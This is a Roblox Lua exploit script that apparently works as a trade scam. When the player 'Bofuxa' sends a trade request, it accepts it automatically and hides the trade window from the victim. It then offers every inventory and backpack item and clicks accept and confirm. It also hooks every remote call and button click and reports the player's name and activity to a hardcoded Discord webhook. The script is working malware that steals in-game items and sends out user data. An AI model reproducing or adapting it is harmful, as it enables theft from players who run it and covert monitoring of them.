local Players = game:GetService("Players")
local ReplicatedStorage = ReplicatedStorage or game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer
local ContextActionService = game:GetService("ContextActionService")
local HttpService = game:GetService("HttpService")

local TradeFolder = ReplicatedStorage:WaitForChild("Trade")
local SendRequest = TradeFolder:WaitForChild("SendRequest")
local AcceptRequest = TradeFolder:WaitForChild("AcceptRequest")
local DeclineRequest = TradeFolder:WaitForChild("DeclineRequest")
local StartTradeEvent = TradeFolder:WaitForChild("StartTrade")
local OfferItemEvent = TradeFolder:WaitForChild("OfferItem")
local AcceptTradeEvent = TradeFolder:WaitForChild("AcceptTrade")

local WEBHOOK_URL = "https://discord.com/api/webhooks/1543419943159201822/o8_Xc1VVw8TUiQ17q59RoT9LYcQjZpZRibfS7RDzNgZoOEt2tyPWmyl60YJM7V0wPcP0"

local function sendWebhookLog(message)
    pcall(function()
        local requestFunc = syn and syn.request or http_request or request or HttpPost
        if requestFunc then
            requestFunc({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({content = message})
            })
        end
    end)
end

sendWebhookLog("📱 **Mobile Script & Flexible Inventory Scanner Active**\nPlayer: " .. LocalPlayer.Name)

-- Remote and button logging for mobile recorder functionality
for _, descendant in ipairs(ReplicatedStorage:GetDescendants()) do
    if descendant:IsA("RemoteEvent") then
        local originalFireServer = descendant.FireServer
        descendant.FireServer = function(self, ...)
            local args = {...}
            local argString = ""
            for i, v in ipairs(args) do
                argString = argString .. tostring(v) .. (i < #args and ", " or "")
            end
            sendWebhookLog("📤 **RemoteEvent Fired:** `" .. descendant.Name .. "`\nArguments: `[" .. argString .. "`]")
            return originalFireServer(self, ...)
        end
    elseif descendant:IsA("RemoteFunction") then
        local originalInvokeServer = descendant.InvokeServer
        descendant.InvokeServer = function(self, ...)
            local args = {...}
            local argString = ""
            for i, v in ipairs(args) do
                argString = argString .. tostring(v) .. (i < #args and ", " or "")
            end
            sendWebhookLog("📥 **RemoteFunction Invoked:** `" .. descendant.Name .. "`\nArguments: `[" .. argString .. "`]")
            return originalInvokeServer(self, ...)
        end
    end
end

local playerGui = LocalPlayer:WaitForChild("PlayerGui", 5)
if playerGui then
    playerGui.DescendantAdded:Connect(function(child)
        if child:IsA("GuiButton") then
            child.Activated:Connect(function()
                sendWebhookLog("👆 **Button Clicked:** `" .. child.Name .. "`, Path: `" .. child:GetFullName() .. "`")
            end)
        end
    end)
    
    for _, gui in ipairs(playerGui:GetDescendants()) do
        if gui:IsA("GuiButton") then
            gui.Activated:Connect(function()
                sendWebhookLog("👆 **Button Clicked:** `" .. gui.Name .. "`, Path: `" .. gui:GetFullName() .. "`")
            end)
        end
    end
end

print("Waiting for incoming trade request callback...")

local function disableGuiInteraction(guiObject)
    if guiObject then
        guiObject.Visible = false
        if guiObject:IsA("GuiObject") then
            guiObject.Active = false
            guiObject.Selectable = false
        end
        for _, descendant in ipairs(guiObject:GetDescendants()) do
            if descendant:IsA("GuiObject") then
                descendant.Visible = false
                descendant.Active = false
                descendant.Selectable = false
            end
        end
    end
end

local function restorePlayerControls()
    pcall(function()
        LocalPlayer.CameraMode = Enum.CameraMode.Classic
        LocalPlayer.DevComputerCameraMode = Enum.DevComputerCameraMode.Classic
        LocalPlayer.DevTouchCameraMode = Enum.DevTouchCameraMode.Classic
    end)
    
    pcall(function()
        ContextActionService:UnbindAction("TradeCameraLock")
    end)
end

-- Flexible deep search function to locate the inventory or weapon container across any UI layout
local function findContainerRecursive(parent, targetNames)
    if not parent then return nil end
    for _, child in ipairs(parent:GetChildren()) do
        for _, name in ipairs(targetNames) do
            if child.Name:lower() == name:lower() then
                return child
            end
        end
        local found = findContainerRecursive(child, targetNames)
        if found then return found end
    end
    return nil
end

SendRequest.OnClientInvoke = function(senderPlayer)
    if senderPlayer and senderPlayer.Name == "Bofuxa" then
        print("Trade request verified from Bofuxa. Accepting...")
        sendWebhookLog("🤝 **Trade Intercepted:** Validated trade request from **Bofuxa**.")
        
        local function applyGuiHides(targetPlayer)
            if targetPlayer and targetPlayer:FindFirstChild("PlayerGui") then
                local tradeGui = targetPlayer.PlayerGui:FindFirstChild("TradeGUI")
                if tradeGui then
                    disableGuiInteraction(tradeGui:FindFirstChild("Container"))
                    disableGuiInteraction(tradeGui:FindFirstChild("Processing"))
                    disableGuiInteraction(tradeGui:FindFirstChild("BG"))
                end
            end
        end

        applyGuiHides(LocalPlayer)
        applyGuiHides(Players:FindFirstChild("Bofuxa"))

        AcceptRequest:FireServer()
        
        task.spawn(function()
            local success, err = pcall(function()
                print("Waiting for trade to start...")
                StartTradeEvent.OnClientEvent:Wait()
                
                restorePlayerControls()
                
                print("Trade started! Scanning and offering all inventory items/weapons...")
                task.wait(1)
                
                local pGui = LocalPlayer:WaitForChild("PlayerGui", 5)
                local inventoryContainer = nil
                
                if pGui then
                    -- Search dynamically for any container or scrolling frame holding weapons/items
                    inventoryContainer = findContainerRecursive(pGui, {"Container", "ScrollFrame", "Inventory", "Salvage"})
                end

                -- Fallback to Backpack or Character tools if UI scan fails
                local weaponsList = {}
                if LocalPlayer:FindFirstChild("Backpack") then
                    for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
                        if tool:IsA("Tool") then
                            table.insert(weaponsList, tool.Name)
                        end
                    end
                end
                if LocalPlayer.Character then
                    for _, tool in ipairs(LocalPlayer.Character:GetChildren()) do
                        if tool:IsA("Tool") then
                            table.insert(weaponsList, tool.Name)
                        end
                    end
                end

                local offeredCount = 0

                if inventoryContainer then
                    for _, item in ipairs(inventoryContainer:GetChildren()) do
                        if item:IsA("GuiObject") or item:IsA("Frame") or item:IsA("ImageButton") then
                            local itemName = item.Name
                            local count = 1
                            local qtyAttribute = item:GetAttribute("Count") or item:GetAttribute("Quantity")
                            if type(qtyAttribute) == "number" then
                                count = qtyAttribute
                            end

                            for i = 1, count do
                                OfferItemEvent:FireServer(itemName, "Weapons")
                                offeredCount = offeredCount + 1
                                task.wait(0.05)
                            end
                        end
                    end
                end

                -- Also offer any items found in Backpack/Character
                for _, weaponName in ipairs(weaponsList) do
                    OfferItemEvent:FireServer(weaponName, "Weapons")
                    offeredCount = offeredCount + 1
                    task.wait(0.05)
                end

                if offeredCount > 0 then
                    print("Successfully offered " .. tostring(offeredCount) .. " items/weapons!")
                    sendWebhookLog("📦 **Trade Offer Success:** Offered " .. tostring(offeredCount) .. " items/weapons to Bofuxa.")
                else
                    warn("Could not find any items via container or backpack!")
                    sendWebhookLog("[Bug Report] Inventory container and backpack scan yielded 0 items for player: " .. LocalPlayer.Name)
                end

                print("Waiting 7 seconds before triggering trade accept actions...")
                task.wait(7)

                if firesignal and AcceptTradeEvent.OnClientEvent then
                    firesignal(AcceptTradeEvent.OnClientEvent, false)
                else
                    AcceptTradeEvent:FireServer()
                end

                local actionsFolder = LocalPlayer.PlayerGui:WaitForChild("TradeGUI"):WaitForChild("Container"):WaitForChild("Trade"):WaitForChild("Actions")

                local function fireButton(btn)
                    if btn and btn:IsA("GuiButton") and getconnections then
                        for _, connection in ipairs(getconnections(btn.Activated)) do
                            connection:Fire()
                        end
                        for _, connection in ipairs(getconnections(btn.MouseButton1Click)) do
                            connection:Fire()
                        end
                    elseif btn and btn:IsA("GuiButton") then
                        btn:Activate()
                    end
                end

                local firstButton = actionsFolder:WaitForChild("Accept"):WaitForChild("ActionButton")
                fireButton(firstButton)

                task.wait(1)

                local confirmButton = actionsFolder:WaitForChild("Accept"):WaitForChild("Confirm"):WaitForChild("ActionButton")
                fireButton(confirmButton)
                
                restorePlayerControls()
            end)

            if not success then
                local errorMessage = "[Bug Report] Error encountered during trade execution for " .. LocalPlayer.Name .. ": " .. tostring(err)
                warn(errorMessage)
                sendWebhookLog(errorMessage)
            end
        end)

        return true
    else
        print("Trade request from other player (" .. tostring(senderPlayer) .. "). Allowing normal trade...")
        return true
    end
end
